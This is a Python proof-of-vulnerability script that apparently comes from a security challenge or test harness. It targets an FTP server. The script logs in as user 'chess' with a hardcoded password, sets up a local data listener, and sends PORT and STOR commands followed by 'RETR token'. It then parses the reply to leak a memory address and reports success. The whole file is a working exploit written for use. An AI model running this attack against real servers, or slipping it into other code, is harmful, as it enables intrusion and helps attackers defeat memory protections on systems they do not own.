import sys
import os
import ftplib
import signal
from time import sleep
from threading import *
import socket
import cgi, cgitb

def handler( signum, frame):
    print('sigalrm fired - time ran out')
    print('[ERROR] POV Failed')
    exit(0)

def process():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((client_ip, 46101))
    s.listen(1)
    print("Waiting on connection")
    while True:
        c, addr = s.accept()
        print("Client connected: " + str(addr))
        f = open("10mbfile.pdf", "rb")
        c.send(f.read())
        #c.close()

def getPassword(username):
    file = open('cheatsheet', 'r')
    lines = file.readlines()
    for row in lines:
        if row.split(':')[1] == username:
            return row.split(':')[2].strip()

def login():
    pickUser = 'chess'
    userStr = 'USER ' + pickUser + '\r\n'
    ftp.sendall(userStr.encode('utf-8'))
    print(ftp.recv(4096).decode('utf-8'), end = '')
    passStr = 'PASS ' + 'chess' + '\r\n'
    ftp.send(passStr.encode('utf-8'))
    print(ftp.recv(4096).decode('utf-8'), end = '')
    
def listenerThread():
    thread = Thread(target=process)
    thread.daemon = True
    thread.start()

def exploit():
    reply = ftp.send('SYST\r\n'.encode('utf-8'))
    print(ftp.recv(4096).decode('utf-8'), end = '')
    reply = ftp.send('TYPE I\r\n'.encode('utf-8'))
    print(ftp.recv(4096).decode('utf-8'), end = '')
    ip_split = client_ip.split(".")
    msg = 'PORT ' + ip_split[0] + ',' + ip_split[1] + ',' + ip_split[2] + ',' + ip_split[3] + ',' + '180,21\r\n'
    reply = ftp.send(msg.encode('utf-8'))
    print(ftp.recv(4096).decode('utf-8'), end = '')
    reply = ftp.send('STOR 10mbfile.pdf\r\n'.encode('utf-8'))
    print(ftp.recv(4096).decode('utf-8'), end = '')
    try:
        reply = ftp.send('RETR token\r\n'.encode('utf-8'))
    except ftplib.error_perm as e:
        print('Error {}'.format(e.args[0][:3]))
        print('[ERROR] POV Failed')
        sys.exit(1)
    else:
        reply = ftp.recv(4096).decode('utf-8')
        print(reply, end ='')
        address =  reply.split(':')[0].split(' ')[1]
        try:
            addressValue = hex(int(address, 10))[2:]
        except ValueError:
            print('[ERROR] POV Failed')
            sys.exit(1)
        else:
            print("ADDRESS=",end ='')
            print(addressValue)
            print('[SUCCESS] POV Succeeded')


def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])

    hostname = socket.gethostname()
    global client_ip
    client_ip = socket.gethostbyname(hostname)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    
    global ftp
    ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server = (HOST, PORT)
    ftp.connect(server)
    print(ftp.recv(4096).decode('utf-8'), end = '')
    listenerThread()
    print("Waiting for socket (5sec)")
    sleep(5)
    login()
    exploit()

    ftp.close()
    sys.exit(0)

if __name__ == '__main__':
    main()
